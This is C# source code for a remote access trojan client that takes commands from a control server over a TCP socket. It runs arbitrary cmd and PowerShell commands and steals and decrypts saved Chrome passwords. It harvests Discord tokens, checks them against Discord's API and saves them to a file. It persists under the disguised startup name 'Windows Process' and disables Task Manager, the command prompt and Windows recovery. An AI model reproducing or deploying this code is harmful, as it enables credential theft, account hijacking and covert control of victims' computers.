using System;
using System.Diagnostics;
using System.IO;
using Microsoft.Win32;
using System.Net.Sockets;
using System.Text;
using System.Collections.Generic;
using Newtonsoft.Json;
using System.Windows.Forms;
using System.Security.Cryptography;
using System.Data.SQLite;

namespace Rat_Client
{
    internal class Program
    {
        static NetworkStream stream { get; set; }
        static string clientName = "Windows Process"; // Name for the startup entry

        static void Main(string[] args)
        {
            TcpClient client = new TcpClient("localhost", 6969);
            stream = client.GetStream();

            while (true)
            {
                string[] input = Receive();

                // Handle commands from the server
                switch (input[0])
                {
                    case "cmdcommand":
                        ExecuteCmdCommand(input[1]);
                        break;
                    case "pscommand":
                        ExecutePowerShellCommand(input[1]);
                        break;
                    case "disable_cmd":
                        DisableCmd();
                        break;
                    case "enable_cmd":
                        EnableCmd();
                        break;
                    case "disable_taskmanager":
                        DisableTaskManager();
                        break;
                    case "enable_taskmanager":
                        EnableTaskManager();
                        break;
                    case "add_to_startup":
                        AddToStartup();
                        break;
                    case "remove_from_startup":
                        RemoveFromStartup();
                        break;
                    case "get_discord_tokens":
                        RetrieveDiscordTokens();
                        break;
                    case "disable_reagentc":
                        DisableReagentc();
                        break;
                    case "enable_reagentc":
                        EnableReagentc();
                        break;
                    case "chrome_info":
                        GrabChromePasswords();
                        break;
                }
            }
        }

        private static void GrabChromePasswords()
        {
            string loginDataPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile), @"AppData\Local\Google\Chrome\User Data\Default\Login Data");

            if (!File.Exists(loginDataPath))
            {
                Send("No Chrome data found.");
                return;
            }

            string tempDbPath = Path.Combine(Path.GetTempPath(), "ChromeLoginData.db");
            File.Copy(loginDataPath, tempDbPath, true);

            using (var connection = new SQLiteConnection("Data Source=" + tempDbPath + ";Version=3;"))
            {
                connection.Open();

                string query = "SELECT origin_url, username_value, password_value FROM logins";
                using (var command = new SQLiteCommand(query, connection))
                {
                    using (var reader = command.ExecuteReader())
                    {
                        StringBuilder chromePasswords = new StringBuilder();

                        while (reader.Read())
                        {
                            string originUrl = reader.GetString(0);
                            string username = reader.GetString(1);
                            byte[] passwordBytes = (byte[])reader["password_value"];

                            string decryptedPassword = DecryptPassword(passwordBytes);

                            chromePasswords.AppendLine($"Website: {originUrl}, Email: {username}, Password: {decryptedPassword}");
                        }

                        if (chromePasswords.Length > 0)
                        {
                            Send(chromePasswords.ToString());
                        }
                        else
                        {
                            Send("No saved passwords found.");
                        }
                    }
                }
            }

            File.Delete(tempDbPath);
        }

        private static string DecryptPassword(byte[] encryptedPassword)
        {
            try
            {
                byte[] decryptedBytes = ProtectedData.Unprotect(encryptedPassword, null, DataProtectionScope.CurrentUser);

                return Encoding.UTF8.GetString(decryptedBytes);
            }
            catch
            {
                return "Unable to decrypt password.";
            }
        }

        private static void EnableReagentc()
        {
            try
            {
                RegistryKey key = Registry.LocalMachine.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Setup", true);
                if (key != null)
                {
                    key.SetValue("RecoveryEnvironmentEnabled", 1, RegistryValueKind.DWord);
                    key.Close();
                    Send("Reagentc has been enabled.");
                }
                else
                {
                    Send("Failed to access registry key.");
                }
            }
            catch (Exception ex)
            {
                Send($"Error enabling reagentc: {ex.Message}");
            }
        }

        private static void DisableReagentc()
        {
            try
            {
                RegistryKey key = Registry.LocalMachine.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Setup", true);
                if (key != null)
                {
                    key.SetValue("RecoveryEnvironmentEnabled", 0, RegistryValueKind.DWord);
                    key.Close();
                    Send("Reagentc has been disabled.");
                }
                else
                {
                    Send("Failed to access registry key.");
                }
            }
            catch (Exception ex)
            {
                Send($"Error disabling reagentc: {ex.Message}");
            }
        }

        private static void Send(string message)
        {
            byte[] data = Encoding.ASCII.GetBytes(message + "|");
            stream.Write(data, 0, data.Length);
            stream.Flush();
        }

        private static void ExecuteCmdCommand(string command)
        {
            try
            {
                Process process = new Process();
                process.StartInfo.FileName = "cmd.exe";
                process.StartInfo.Arguments = "/C " + command;
                process.StartInfo.RedirectStandardOutput = true;
                process.StartInfo.UseShellExecute = false;
                process.StartInfo.CreateNoWindow = true;

                process.Start();

                string output = process.StandardOutput.ReadToEnd();
                Console.WriteLine("CMD Output: " + output);
            }
            catch (Exception ex)
            {
                Console.WriteLine("Error executing CMD command: " + ex.Message);
            }
        }

        private static void ExecutePowerShellCommand(string command)
        {
            try
            {
                Process process = new Process();
                process.StartInfo.FileName = "powershell.exe";
                process.StartInfo.Arguments = "-Command " + command;
                process.StartInfo.RedirectStandardOutput = true;
                process.StartInfo.UseShellExecute = false;
                process.StartInfo.CreateNoWindow = true;

                process.Start();

                string output = process.StandardOutput.ReadToEnd();
                Console.WriteLine("PowerShell Output: " + output);
            }
            catch (Exception ex)
            {
                Console.WriteLine("Error executing PowerShell command: " + ex.Message);
            }
        }

        private static void DisableCmd()
        {
            RegistryKey key = Registry.CurrentUser.CreateSubKey(@"Software\Policies\Microsoft\Windows\System");
            key.SetValue("DisableCMD", 2, RegistryValueKind.DWord);
            key.Close();
        }

        private static void EnableCmd()
        {
            RegistryKey key = Registry.CurrentUser.CreateSubKey(@"Software\Policies\Microsoft\Windows\System");
            key.DeleteValue("DisableCMD", false);
            key.Close();
        }

        private static void DisableTaskManager()
        {
            RegistryKey key = Registry.CurrentUser.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\System");
            key.SetValue("DisableTaskMgr", 1, RegistryValueKind.DWord);
            key.Close();
        }

        private static void RetrieveDiscordTokens()
        {
            try
            {
                List<string> tokensWithUsernames = new List<string>();
                string localAppData = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
                string roaming = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
                string desktopPath = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);

                // Check common Discord locations
                string[] paths = {
            Path.Combine(roaming, "Discord", "Local Storage", "leveldb"),
            Path.Combine(roaming, "DiscordCanary", "Local Storage", "leveldb"),
            Path.Combine(roaming, "DiscordPTB", "Local Storage", "leveldb"),
            Path.Combine(localAppData, "Google", "Chrome", "User Data", "Default", "Local Storage", "leveldb"),
            Path.Combine(localAppData, "Microsoft", "Edge", "User Data", "Default", "Local Storage", "leveldb")
        };

                foreach (string path in paths)
                {
                    if (Directory.Exists(path))
                    {
                        foreach (string file in Directory.GetFiles(path, "*.ldb"))
                        {
                            string content = File.ReadAllText(file);
                            var tokens = ExtractTokens(content);

                            foreach (var token in tokens)
                            {
                                string username = GetDiscordUsername(token);
                                if (!string.IsNullOrEmpty(username))
                                {
                                    tokensWithUsernames.Add($"{username}: {token}");
                                }
                                else
                                {
                                    tokensWithUsernames.Add($"Unknown User: {token}");
                                }
                            }
                        }
                    }
                }

                // Save tokens with usernames to desktop
                string filePath = Path.Combine(desktopPath, "DiscordTokens.txt");
                if (tokensWithUsernames.Count > 0)
                {
                    File.WriteAllText(filePath, string.Join(Environment.NewLine, tokensWithUsernames));
                    Send($"discord_tokens|Tokens saved to: {filePath}");
                }
                else
                {
                    File.WriteAllText(filePath, "No tokens found.");
                    Send("discord_tokens|No tokens found.");
                }
            }
            catch (Exception ex)
            {
                Send($"discord_tokens|Error retrieving tokens: {ex.Message}");
            }
        }

        private static IEnumerable<string> ExtractTokens(string content)
        {
            List<string> tokens = new List<string>();
            foreach (System.Text.RegularExpressions.Match match in System.Text.RegularExpressions.Regex.Matches(content, @"[\w-]{24}\.[\w-]{6}\.[\w-]{27}"))
            {
                tokens.Add(match.Value);
            }
            return tokens;
        }

        private static string GetDiscordUsername(string token)
        {
            try
            {
                // Use Discord API to get the username from the token
                string apiUrl = "https://discord.com/api/v9/users/@me";
                using (var client = new System.Net.Http.HttpClient())
                {
                    client.DefaultRequestHeaders.Add("Authorization", token);
                    var response = client.GetAsync(apiUrl).Result;

                    if (response.IsSuccessStatusCode)
                    {
                        string jsonResponse = response.Content.ReadAsStringAsync().Result;
                        dynamic userData = Newtonsoft.Json.JsonConvert.DeserializeObject(jsonResponse);
                        return userData.username + "#" + userData.discriminator;
                    }
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show($"{ex.Message}");
            }
            return null;
        }


        private static void EnableTaskManager()
        {
            RegistryKey key = Registry.CurrentUser.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\System");
            key.DeleteValue("DisableTaskMgr", false);
            key.Close();
        }

        private static void AddToStartup()
        {
            RegistryKey key = Registry.CurrentUser.OpenSubKey(@"Software\Microsoft\Windows\CurrentVersion\Run", true);
            string executablePath = System.Reflection.Assembly.GetExecutingAssembly().Location;
            key.SetValue(clientName, executablePath);
            key.Close();
        }

        private static void RemoveFromStartup()
        {
            RegistryKey key = Registry.CurrentUser.OpenSubKey(@"Software\Microsoft\Windows\CurrentVersion\Run", true);
            key.DeleteValue(clientName, false);
            key.Close();
        }

        private static string[] Receive()
        {
            byte[] bytes = new byte[1024];
            int bytesRead = stream.Read(bytes, 0, bytes.Length);
            stream.Flush();
            return Encoding.ASCII.GetString(bytes, 0, bytesRead).Split('|');
        }
    }
}
